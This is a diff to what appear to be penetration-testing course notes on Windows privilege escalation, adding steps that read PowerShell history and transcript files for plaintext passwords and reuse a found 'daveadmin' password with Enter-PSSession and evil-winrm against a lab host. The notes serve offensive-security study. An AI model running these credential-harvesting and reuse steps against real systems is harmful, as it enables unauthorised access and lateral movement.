@@ -1119,9 +1119,26 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   ```
   - Display path of the history file from PSReadline
     `(Get-PSReadlineOption).HistorySavePath`
-  - ddd
-  - dd
-  - dd 
+    `type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
+    ```
+    Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
+    Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
+    Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
+    Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+    ```
+  - PowerShell Remoting by default uses WinRM for Cmdlets such as Enter-PSSession. Therefore, a user needs to be in the local group Windows Management Users
+  - type C:\Users\Public\Transcripts\transcript01.txt
+    ```
+    Transcript started, output file is C:\Users\Public\Transcripts\transcript01.txt
+    PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+    PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+    PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+    PS C:\Users\dave> Stop-Transcript
+    ```
+  - Using the commands from the transcript file to obtain a PowerShell session as daveadmin. Start a PowerShell remoting session via WinRM on CLIENTWK220 as the user daveadmi (No output dir)
+  - Use evil-winrm to connect to CLIENTWK220 as daveadmin instead  
+    `evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"`
+  - 
 - Automated Enumeration  
 ### 18. Linux privilege escalation
 ### 19. Port redirection and SSH tunneling
